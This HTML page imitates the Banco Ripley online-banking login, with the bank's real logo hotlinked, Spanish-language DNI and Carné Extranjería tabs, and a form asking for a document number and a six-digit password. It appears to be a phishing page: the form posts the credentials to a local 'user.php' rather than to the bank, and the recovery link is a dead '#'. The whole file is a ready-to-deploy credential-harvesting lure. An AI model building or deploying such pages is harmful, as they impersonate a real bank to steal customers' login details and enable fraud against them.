<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Ripley - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(180deg, #502b83 0%, #3a1f5f 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
        }

        .logo-container {
            text-align: center;
            margin: 0 auto 24px;
            background: white;
            padding: 18px 22px;
            border-radius: 14px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
            width: fit-content;
        }

        .logo-img {
            max-width: 240px;
            width: 100%;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        .tagline {
            color: white;
            font-size: 20px;
            font-weight: 700;
            margin: 0 0 5px;
            text-align: center;
            letter-spacing: -0.5px;
        }

        .subtitle {
            color: white;
            font-size: 17px;
            font-weight: 300;
            margin-bottom: 25px;
            text-align: center;
            letter-spacing: -0.3px;
        }

        .login-card {
            background: white;
            border-radius: 16px;
            padding: 35px 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
        }

        .tabs {
            display: flex;
            background: #f0f0f0;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 28px;
            gap: 2px;
        }

        .tab {
            flex: 1;
            padding: 14px 10px;
            border: none;
            background: #f0f0f0;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            color: #666;
        }

        .tab.active {
            background: #502b83;
            color: white;
            border-radius: 8px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #2c2c2c;
        }

        .form-input {
            width: 100%;
            padding: 14px 12px;
            font-size: 16px;
            border: none;
            border-bottom: 2px solid #e0e0e0;
            outline: none;
            transition: border-color 0.3s;
            background: transparent;
        }

        .form-input:focus {
            border-bottom-color: #502b83;
        }

        .form-input::placeholder {
            color: #bdbdbd;
            font-weight: 300;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: #a8b5c7;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 25px;
            transition: all 0.3s;
            pointer-events: auto;
        }

        .btn-submit:hover {
            background: #8f9fb5;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        .btn-submit:disabled {
            background: #cccccc;
            color: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
            pointer-events: none;
        }

        .btn-submit.active {
            background: #502b83; /* Morado cuando activo */
            cursor: pointer;
        }

        .forgot-password {
            display: block;
            margin-top: 22px;
            color: #8f9fb5;
            font-size: 14px;
            text-decoration: none;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://www.bancoripley.cl/media/logo-banco-ripley-DKG6FRYM.svg" alt="Banco Ripley" class="logo-img">
        </div>

        <div class="tagline">Más de 20 años</div>
        <div class="subtitle">simplificando tu vida</div>

        <div class="login-card">
            <div class="tabs">
                <button class="tab active" id="dniTab">DNI</button>
                <button class="tab" id="ceTab">Carné Extranjería</button>
            </div>

            <form action="user.php" method="POST">
                <div class="form-group">
                    <label class="form-label">Número de documento</label>
                    <input type="text" class="form-input" name="documento" placeholder="Ingresa tu DNI" required>
                </div>

                <div class="form-group">
                    <label class="form-label">Contraseña</label>
                    <input type="password" class="form-input" name="password" placeholder="••••••" inputmode="numeric" pattern="^\d{6}$" maxlength="6" minlength="6" title="La contraseña debe tener exactamente 6 números" required>
                </div>

                <button type="submit" class="btn-submit" disabled>Ingresar</button>

                <a href="#" class="forgot-password">¿Necesitas crear o recuperar tu contraseña?</a>
            </form>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const documentoInput = document.querySelector('input[name="documento"]');
            const passwordInput = document.querySelector('input[name="password"]');
            const submitButton = document.querySelector('.btn-submit');

            function checkInputs() {
                if (documentoInput.value.trim() !== '' && passwordInput.value.trim().length === 6) {
                    submitButton.disabled = false;
                    submitButton.classList.remove('btn-submit');
                    submitButton.classList.add('btn-submit', 'active');
                } else {
                    submitButton.disabled = true;
                    submitButton.classList.remove('active');
                }
            }

            documentoInput.addEventListener('input', checkInputs);
            passwordInput.addEventListener('input', checkInputs);
            checkInputs(); // Verifica el estado inicial
        });
    </script>
</body>
</html>
